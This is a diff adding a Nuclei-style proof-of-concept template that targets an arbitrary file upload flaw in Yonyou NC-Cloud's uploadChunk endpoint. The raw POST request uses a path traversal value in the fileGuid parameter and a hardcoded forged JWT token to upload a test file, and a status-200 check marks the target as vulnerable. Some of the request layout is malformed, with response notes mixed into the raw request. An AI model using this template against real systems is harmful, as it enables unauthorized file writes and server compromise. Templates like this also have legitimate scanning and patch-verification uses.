@@ -1,0 +1,56 @@
+id: poc-hbhc5zkoyduigko3
+info:
+  name: 用友 NC-Cloud uploadChunk 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hbhc5zkoyduigko3'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hbhc5zkoyduigko3
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1 HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9
+
+
+    accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+
+
+
+
+    --024ff46f71634a1c9bf8ec5820c26fa9
+
+
+    Content-Disposition: form-data; name="file"; filename="test.txt"
+
+
+
+
+    This website has an arbitrary file upload vulnerability
+
+
+    --024ff46f71634a1c9bf8ec5820c26fa9--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    操作成功
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
